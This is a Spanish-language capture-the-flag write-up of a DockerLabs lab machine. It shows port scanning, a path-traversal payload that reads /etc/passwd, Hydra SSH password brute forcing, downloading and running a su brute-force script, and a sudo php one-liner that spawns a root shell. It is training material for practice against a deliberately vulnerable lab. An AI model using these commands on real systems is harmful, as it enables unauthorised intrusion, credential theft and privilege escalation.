# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d3884464-0007-49ca-94dd-a9b95836fc5f)

En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp (SSH ):** OpenSSH 9.2p1
2. **80/tcp (HTTP ):** Apache httpd 2.4.57

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a la página por defecto de Apache en la máquina vulnerable, confirmando así el correcto funcionamiento del servidor web Apache en Debian. La página por defecto de Apache en Debian muestra el mensaje "Apache2 Debian Default Page".
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/08d882c0-1295-4d50-a978-7c69d49fc51f)

# Fase 2- Exploración
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/845973f6-603f-438b-8d93-1aa6040bb30f)
Al realizar un fuzzing con Feroxbuster se encontró varias cosas.
```sql
http://172.17.0.2/
http://172.17.0.2/icons/openlogo-75.png
http://172.17.0.2/shop => http://172.17.0.2/shop/
http://172.17.0.2/index.html
http://172.17.0.2/shop/keyboard.jpg
http://172.17.0.2/shop/index.php
```

#### Shop
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/41f9c9b8-8be5-4ed0-9a6f-673f50eba91e)
Al entrar a /shop se encontró con una tienda de teclados con un error de sistema.
`"Error de Sistema: ($_GET['archivo']");` Este es el error.
Esto nos dice que se está usando un parámetro llamado **archivo** en la url para pasarle un valor e incluir un archivo en la web. Esto puede ser vulnerable ante un **LFI** (Local File Inclusión).

# Fase 3- Explotación

#### Path
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b4fd2492-d311-464f-8541-1d9f12c7d72e)
Conseguimos leer archivos internos haciendo un Path Traversal.
```sql
http://172.17.0.2/shop/?archivo=../../../../../../etc/passwd
```
Tenemos dos usuarios posibles, podríamos probar con ssh.
```sql
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
```

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1000a2d1-d750-4e00-b37e-c531d89dbb04)
Usando el comando: 
`hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10`
Pudimos sacar la contraseña del usuario `manchi`.

# Fase 4- Privilegios

#### Lio
Revisamos todito y no encontramos nada, por lo que vamos a transferirnos un script para hacer fuerza bruta hacia el usuario **seller** desde la propia máquina. Nos transferiremos también el diccionario **rockyou**.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/bc2965c3-aaf5-42bb-a8a4-09202620d78d)

Nos descargamos el script.sh del siguiente repositorio en la **máquina atacante**-> [Script de fuerza bruta](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)

```shell
wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh
```

Probamos a transferirlo con **wget** o **curl** pero no es posible porque no están instalados. Los transferiremos utilizando **SCP** (Secure Copy) a la máquina con la dirección IP 172.17.0.2 a través de SSH.

Desde la máquina atacante indicamos la ruta del archivo a transferir y la ruta de la máquina víctima donde se alojará:

```shell
scp rockyou.txt manchi@172.17.0.2:/home/manchi/rockyou.txt
scp Linux-Su-Force.sh manchi@172.17.0.2:/home/manchi/rockyou.txt
```

Le daremos permisos de ejecución y lo ejecutaremos hacia el usuario *_seller_:

```shell
./Linux-Su-Force.sh seller rockyou.txt 
-----------------------------------------
Contraseña encontrada para el usuario seller: qwerty
```

#### Qwerty
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/68818218-b475-44c1-9cb0-cbfec962b78c)

Como el usuario Seller, podemos ejecutar el binario php.

#### php
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/649bcf0d-5145-4412-839a-f77c8230f7c5)

Despues de mirar en gtfobins vemos que para escalar es necesario ejecutar 2 comandos:
```
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```
Y ya somos usuario root.
